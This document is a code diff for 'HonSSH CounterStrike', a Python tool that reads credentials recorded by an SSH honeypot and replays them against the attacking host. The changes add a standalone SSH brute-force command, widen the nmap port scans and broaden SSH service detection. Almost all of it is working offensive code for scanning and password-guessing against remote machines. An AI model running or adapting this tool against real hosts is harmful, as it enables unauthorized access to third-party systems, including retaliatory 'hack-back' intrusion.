@@ -1,5 +1,6 @@
 #!/usr/bin/env python
 
+# WARNING: This is experimental!
 # HonSSH CounterStrike SSH BruteForce using spoofed HonSSH auth creds!
 # @TheRealCounterStrike
 
@@ -76,12 +77,35 @@ class SshTarget(object):
                 valid_logins.append((usern, passw))
         return valid_logins
 
+    @staticmethod
+    def parseHonsshSpoofLog(user_pw_path=dirname(argv[0]) + '/logs/spoof.log'):
+        result=[]
+        try:
+            with open(user_pw_path, 'r') as slog:
+                for line in slog.readlines():
+                    result.append(re.search(r'^(.*?) - (.*?) - ', line).groups())
+        except Exception as ex:
+            msg(RED, '[HONSSH][SPOOF-LOG]', 'Error: %s' % (str(ex)))
+        return result
+
+    @staticmethod
+    def sshBruteForce(remote_ip, possible_ssh_ports):
+        ssh = SshTarget()
+        result = {}
+        user_pass_list = SshTarget.parseHonsshSpoofLog()
+        for possible_ssh_port in possible_ssh_ports:
+            result[str(possible_ssh_port)] = \
+                ssh.fire((remote_ip, possible_ssh_port), user_pass_list)
+        return result
+
 class NmapTarget(object):
     nm = nmap.PortScanner()
     nmap_output = None
 
     def fire(self, remote_ip):
-        self.nmap_output = self.nm.scan(remote_ip, arguments='-sV -Pn')
+        self.nmap_output = self.nm.scan(remote_ip, arguments='-sV -Pn --top-ports 2000')
+        self.minn_output = self.nm.scan(remote_ip, arguments='-sV -Pn -p 22,2222,22050')
+        self.nmap_output['scan'][remote_ip]['tcp'].update(self.minn_output['scan'][remote_ip]['tcp'])
         print json.dumps(self.nmap_output['scan'][remote_ip], indent=4, sort_keys=True)
 
 class NmapReceiver(ProcessProtocol):
@@ -145,34 +169,20 @@ class JsonReceiver(LineReceiver):
     def isUnscannedRemote(self):
         return True if self.remote_ip not in self.targets else False
 
-    def parseHonsshSpoofLog(self, user_pw_path=dirname(argv[0]) + '/logs/spoof.log'):
-        result=[]
-        try:
-            with open(user_pw_path, 'r') as slog:
-                for line in slog.readlines():
-                    result.append(re.search(r'^(.*?) - (.*?) - ', line).groups())
-        except Exception as ex:
-            msg(RED, '[HONSSH][SPOOF-LOG]', 'Error: %s' % (str(ex)))
-        return result
-
     def startSshBruteForce(self, possible_ssh_ports):
         msg(LBLUE, '[PROTOCOL][DISPATCH]', 'Initiating SSH brute force for <%s>..' %
             (self.remote_ip)
         )
-        self.ssh = SshTarget()
-        result = {}
-        user_pass_list = self.parseHonsshSpoofLog()
-        for possible_ssh_port in possible_ssh_ports:
-            result[str(possible_ssh_port)] = \
-                self.ssh.fire((self.remote_ip, possible_ssh_port), user_pass_list)
-        return result
+        return SshTarget.sshBruteForce(self.remote_ip, possible_ssh_ports)
 
     def getPossibleSshServices(self):
         if self.remote_ip not in self.targets:
             return []
         port_list = []
         for key, val in self.targets[self.remote_ip]['tcp'].iteritems():
-            if 'ssh' in val['product'].lower() \
+            if ('ssh' in val['product'].lower() \
+               or 'ssh' in val['name'].lower() \
+               or 'ssh' in val['cpe'].lower()) \
                and 'open' in val['state'].lower():
                    port_list.append(key)
         return port_list
@@ -256,6 +266,7 @@ class CounterFactory(ReconnectingClientFactory):
 
     def clientConnectionLost(self, connector, reason):
         msg(LYELLOW, '[FACTORY]', 'Lost connection.  Reason: %s' % (reason))
+        self.retry(connector)
 
     def clientConnectionFailed(self, connector, reason):
         msg(LRED, '[FACTORY]', 'Connection failed. Reason: %s' % (reason))
@@ -265,11 +276,18 @@ if __name__ == '__main__':
     from sys import exit
     from twisted.internet import reactor
 
-    # NMAP target
     if len(argv) == 3:
+        # NMAP target
         if argv[1] == 'nmap':
             NmapTarget().fire(argv[2])
             exit(0)
+        # SSH BruteForce target
+        elif argv[1] == 'ssh':
+            ip = argv[2].split(':')[0]
+            port = argv[2].split(':')[1]
+            print SshTarget.sshBruteForce(ip, [port])
+            exit(0)
+
     if len(argv) == 0:
         exit(1)
     if len(argv) != 2:
@@ -279,6 +297,7 @@ if __name__ == '__main__':
     log.startLogging(stdout)
     msg(LPURPLE, '[MAIN]', 'HonSSH-CounterStrike')
     msg(LPURPLE, '[MAIN]', '(C) 2018 by Toni Uhlig')
+    msg(LPURPLE, '[MAIN]', 'WARNING: This software is experimental!')
     reactor.connectUNIX(argv[1], CounterFactory())
     reactor.run()
 
